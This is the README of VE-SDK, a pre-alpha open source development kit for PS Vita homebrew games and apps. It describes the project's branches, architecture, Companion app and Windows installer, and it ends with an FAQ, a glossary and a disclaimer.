<div style="font-family:nunito">

<h4 align="center">
<p align="center">
<br>
<img src="./Assets/Logos/veSdkLogo.svg" alt="VitaEngine Icon" height="96">
<br>
<br>
</p>
The technical development repository of <b>VitaEngine</b>
<br>
A long-term open source platform for creating PS Vita games and applications
<br>
<br>
</h4>

---

<h3>Branch status</h3>

<h4 align="left">
<b>This is the official public-facing milestone branch of VE-SDK.</b>
<br>
<br>
The <b>main</b> branch is intended to represent the most <b>curated</b>, 
<b>presentable</b> and <b>high-level</b> snapshot of the VitaEngine technical 
repository at a given point in time.
<br>
<br>
It is not necessarily the newest branch, nor the most experimental one.
Instead, it exists to provide the clearest overall picture of the project’s 
direction, structure and current technical identity.
<br>
<br>
If you are discovering VitaEngine for the first time, this is usually the best 
place to start.
<br>
<br>
</h4>

<h4 align="left">
<b>Project maturity:</b> <b>Pre-Alpha</b>
<br>
<br>
VitaEngine is still in an early architectural and implementation phase.
While parts of the platform may already be runnable or technically inspectable, 
the project should still be treated as a <b>pre-alpha effort under active 
construction</b>.
<br>
<br>
</h4>

<h4 align="left">
<b>Looking for another branch?</b>
<br>
<br>
<ul>
  <li><a href="https://github.com/ali90taz/VE-SDK/tree/main"><b>main</b></a> → curated public-facing milestone branch</li>
  <li><a href="https://github.com/ali90taz/VE-SDK/tree/staging"><b>staging</b></a> → latest reasonably stable and testable integration branch</li>
  <li><a href="https://github.com/ali90taz/VE-SDK/tree/dev"><b>dev</b></a> → active day-to-day development branch</li>
</ul>
<br>
In short:
<br>
<br>
<ul>
  <li><b>main</b> → understand the platform</li>
  <li><b>staging</b> → inspect the latest runnable progress</li>
  <li><b>dev</b> → work directly on the technical core</li>
</ul>
<br>
</h4>

---

<h3>What is VitaEngine?</h3>

<h4 align="left">
<b>VitaEngine</b> is an open source platform envisioned to make <b>PS Vita</b> 
game and application development more accessible, integrated and user-friendly.
<br>
<br>
Its long-term goal is to reduce part of the traditional complexity of the PS Vita 
homebrew workflow by offering a more direct creation experience built around:
<br>
<br>
<ul>
  <li>A dedicated <b>desktop IDE</b></li>
  <li>A native <b>C++ engine/runtime</b> on the console</li>
  <li>A higher-level <b>Lua-based scripting workflow</b></li>
  <li>Faster <b>preview and iteration on real hardware</b></li>
  <li>A more cohesive and modern development experience overall</li>
</ul>
<br>
VitaEngine does <b>not</b> aim to replace the existing PS Vita homebrew 
ecosystem.
The intention is to build a more accessible layer <b>on top of it</b>, 
respecting the community work that made this kind of platform possible.
<br>
<br>
</h4>

---

<h3>What is VE-SDK?</h3>

<h4 align="left">
<b>VE-SDK (VitaEngine SDK)</b> is the <b>technical development repository</b> of 
the VitaEngine platform itself.
<br>
<br>
This repository contains the structural foundation used to <b>design</b>, 
<b>build</b>, <b>test</b> and <b>evolve</b> VitaEngine, including:
<br>
<br>
<ul>
  <li>Source code</li>
  <li>Tooling and automation scripts</li>
  <li>Documentation and architecture notes</li>
  <li>Desktop interface resources</li>
  <li>Experimental components</li>
  <li>Internal support files used during development</li>
</ul>
<br>
This means that <b>VE-SDK is not the final end-user distribution of VitaEngine</b>.
It is the repository where VitaEngine itself is being actively constructed.
<br>
<br>
</h4>

---

<h3>What this branch is meant to communicate</h3>

<h4 align="left">
The purpose of the <b>main</b> branch is not to expose every low-level detail of 
the daily development process.
<br>
<br>
Instead, this branch aims to provide:
<br>
<br>
<ul>
  <li>A clear <b>high-level overview</b> of the platform</li>
  <li>A more approachable entry point for new visitors</li>
  <li>A curated snapshot of the current technical direction</li>
  <li>Context for the project’s architecture and intended workflow</li>
  <li>A stable reference point for documentation and presentation</li>
</ul>
<br>
If you want the rawest and most unstable layer of development, the 
<b>dev</b> branch is the more appropriate place.
<br>
<br>
</h4>

---

<h3>Current visual progress</h3>

<h4 align="left">
Below are optional visual snapshots of the project’s current pre-alpha state.
These are intended to communicate progress and direction — not to imply a final 
or feature-complete user experience.
<br>
<br>
</h4>

<p align="center">
<img src="./Docs/Images/main-01.png" alt="VitaEngine IDE pre-alpha preview" width="80%">
<br>
<em>Current pre-alpha interface preview</em>
</p>

<br>

<p align="center">
<img src="./Docs/Images/main-02.png" alt="VitaEngine launcher pre-alpha preview" width="80%">
<br>
<em>Early development snapshot</em>
</p>

<br>

<p align="center">
<img src="./Docs/Images/main-03.png" alt="VitaEngine workflow preview" width="80%">
<br>
<em>Optional future screenshot / workflow preview</em>
</p>

---

<h3>High-level platform overview</h3>

<h4 align="left">
At a high level, the VitaEngine ecosystem is expected to revolve around the 
following layers:
<br>
<br>
<ul>
  <li><b>VE-SDK</b> → the technical repository and development environment</li>
  <li><b>VitaEngine IDE</b> → the desktop authoring and management interface</li>
  <li><b>VitaEngine Companion</b> → a PS Vita application used for preview and 
  development-oriented communication</li>
  <li><b>Runtime / host components</b> → native execution logic on the console</li>
  <li><b>VEP projects</b> → projects created and managed through the ecosystem</li>
  <li><b>.VPK output</b> → final distributable package for PS Vita</li>
</ul>
<br>
</h4>

---

<h3>Architecture at a glance</h3>

<h4 align="left">
The exact implementation may evolve over time, but the conceptual structure can 
be summarized like this:
<br>
<br>
</h4>

<pre>
VE-SDK
├── IDE (desktop app / tooling / UI)
├── Scripts (setup / build / maintenance)
├── Docs (architecture / notes / references)
├── Assets (internal visuals / resources)
├── Companion (PS Vita bridge app)
├── Runtime / Host (native execution layer)
└── Project workflow (.vep → preview/test → .vpk)
</pre>

<h4 align="left">
This branch intentionally keeps the explanation at a <b>high level</b>.
For lower-level details, implementation-specific notes and active structural 
changes, see the deeper technical documentation and/or the <b>dev</b> branch.
<br>
<br>
</h4>

---

<h3>Platform workflow (conceptual)</h3>

<h4 align="left">
In simplified form, the intended VitaEngine workflow is:
<br>
<br>
</h4>

<pre>
Create or open a .vep project
        ↓
Work inside the VitaEngine IDE
        ↓
Preview / test through real hardware integration
        ↓
Iterate using Companion + tooling
        ↓
Package as .vpk for distribution
</pre>

<h4 align="left">
This workflow is still evolving and should be interpreted as a directional 
architecture rather than a final locked pipeline.
<br>
<br>
</h4>

---

<h3>VitaEngine Companion</h3>

<h4 align="left">
<b>VitaEngine Companion</b> is a <b>PS Vita application</b> focused on the 
development workflow of the platform.
<br>
<br>
Its role is to act as a bridge between the <b>VitaEngine IDE</b> and real 
hardware, enabling development-oriented capabilities such as:
<br>
<br>
<ul>
  <li>Preview of games and applications in development</li>
  <li>Faster iteration directly on the console</li>
  <li>Testing-oriented communication with the desktop environment</li>
  <li>Potential future debug and utility features</li>
</ul>
<br>
Although it is part of the VitaEngine ecosystem, the Companion <b>is not the 
engine itself</b>. It is a specialized support component designed around the 
development process.
<br>
<br>
</h4>

---

<h3>Who is this repository for?</h3>

<h4 align="left">
<b>VE-SDK</b> is primarily intended for:
<br>
<br>
<ul>
  <li><b>Contributors</b></li>
  <li><b>Early adopters</b></li>
  <li><b>Technically curious users</b></li>
  <li>People interested in the architecture of the platform</li>
  <li>People who want to follow the long-term evolution of VitaEngine</li>
</ul>
<br>
If your goal is simply to use VitaEngine as a finished end-user product, the 
long-term intention is to provide a more direct and user-friendly distribution 
separately from this repository.
<br>
<br>
</h4>

---

<h3>Installing VE-SDK</h3>

<h4 align="left">
This branch may provide an automated <b>VE-SDK installer</b> intended to make 
early inspection, testing and technical contribution easier on <b>Windows 11</b>.
<br>
<br>
In the context of the <b>main</b> branch, the installer should be interpreted as 
a convenience layer for accessing the current official milestone snapshot of the 
technical repository — <b>not</b> as a final consumer-facing installer for a 
finished version of VitaEngine.
<br>
<br>
</h4>

> **🛠️ VE-SDK is primarily intended for VitaEngine development itself, early testing and technical contribution — not for end-user production use.**

> **⚠️ Warning: executing remote scripts can be highly unsafe. Only run files from trusted sources and, whenever possible, verify the signature/hash before executing them.**

> **✅ Install.zip file signature (SHA-256):  
> D600A528A1A6B118B1B4D76E8B611F3A315DF87D85F0CE629CC0D933E6C4DD80**

<h4 align="left">
<em>Installation file: 
<a href="https://github.com/ali90taz/VE-SDK/raw/main/Install.zip">
Install.zip</a></em>
<br>
</h4>

<h4>How to install:</h4>

<h4 align="left">
1. Download <b>Install.zip</b>
<br>
2. Extract the contents
<br>
3. Run <b>Install.lnk</b>
<br>
4. Confirm the prompts
<br>
5. Wait for the automatic setup to complete
<br>
<br>
If you prefer a manual installation or want to understand exactly what the 
installer does, check:
<br>
<br>
<i>Scripts/Setup/<a href="https://github.com/ali90taz/VE-SDK/blob/main/Scripts/Setup/Install-VE-SDK.ps1">Install-VE-SDK.ps1</a></i>
<br>
</h4>

---

<h3>Frequently Asked Questions</h3>

<h4 align="left">

<b>Q:</b> Is this repository already the final recommended way to use VitaEngine?
<br>
<b>A:</b> No. This repository represents <b>VE-SDK</b>, the technical foundation 
and development environment of the platform itself. The long-term goal is to 
provide a more user-friendly end-user distribution separately.
<br>
<br>

<b>Q:</b> Which platforms are currently targeted?
<br>
<b>A:</b> VitaEngine is currently being developed with <b>modern Windows</b> as 
the primary host platform. In the future, the intention is to expand support to 
<b>Linux</b> and <b>macOS</b>.
<br>
<br>

<b>Q:</b> Which PS Vita models are expected to be supported by generated 
applications?
<br>
<b>A:</b> The long-term intention is to generate <b>.VPK</b> games and 
applications compatible with both <b>PS Vita Fat</b> and <b>PS Vita Slim</b>. 
At the moment, there are no official plans for <b>PS TV</b> support.
<br>
<br>

<b>Q:</b> Is VitaEngine just a thin layer on top of the Vita SDK?
<br>
<b>A:</b> No. While VitaEngine is expected to build on top of existing PS Vita 
tooling, the long-term vision is for it to become a broader development platform 
with its own workflow, higher-level API and integrated tooling model.
<br>
<br>

<b>Q:</b> Which branch should I use?
<br>
<b>A:</b> If you are discovering the project or want the most curated overview, 
start with <b>main</b>. If you want the latest runnable integration state, check 
<b>staging</b>. If you want the rawest day-to-day technical branch, use 
<b>dev</b>.
<br>
<br>

</h4>

---

<h3>Glossary</h3>

<h4 align="left">

<b>VitaEngine Companion</b> : <i>A PS Vita application focused on the VitaEngine 
development workflow, used as a bridge between the IDE and real hardware for 
preview, testing and auxiliary development features.</i>
<br>

<b>VE</b> : <i>A semantic alias for VitaEngine, used as a shortened form in 
technical and organizational contexts.</i>
<br>

<b>VE-SDK</b> : <i>VitaEngine SDK. The technical foundation and development 
environment of the VitaEngine platform itself, intended for contributors, testing 
and engine evolution.</i>
<br>

<b>VEA</b> : <i>VitaEngine Application. Internal prefix used by applications 
created with VitaEngine.</i>
<br>

<b>VEP</b> : <i>VitaEngine Project. Project file extension used during development.</i>
<br>
<br>
</h4>

---

<h3>Additional documentation</h3>

<h4 align="left">
For deeper technical details, implementation notes and lower-level structural 
documentation, this branch may link to documents such as:
<br>
<br>
<ul>
  <li><b>Docs/Architecture/</b> → platform structure and component relationships</li>
  <li><b>Docs/Workflow/</b> → development flow and branch strategy</li>
  <li><b>Docs/Setup/</b> → setup and environment notes</li>
  <li><b>Docs/Companion/</b> → Companion-related plans and technical notes</li>
</ul>
<br>
The <b>main</b> branch intentionally stays more high-level. Deeper technical 
granularity belongs progressively more to <b>staging</b> and especially 
<b>dev</b>.
<br>
<br>
</h4>

---

<h3>Credits</h3>

<h4 align="left">
This project uses a variety of third-party resources.  
For more information, please check the 
<a href="https://github.com/ali90taz/VE-SDK/blob/main/CREDITS.md">
<i>CREDITS.md</i></a> 
file in this repository.
<br>
<br>
</h4>

---

<h3>Disclaimer</h3>

<h4 align="left">
<ul>
<li>VitaEngine <b>is not affiliated with, endorsed by, or licensed by Sony 
Interactive Entertainment</b>.</li>
<li><b>PS Vita</b> is a trademark of Sony Interactive Entertainment.</li>
<li>Third-party names, assets and technologies belong to their respective owners.</li>
</ul>
<br>
</h4>

---

</div>
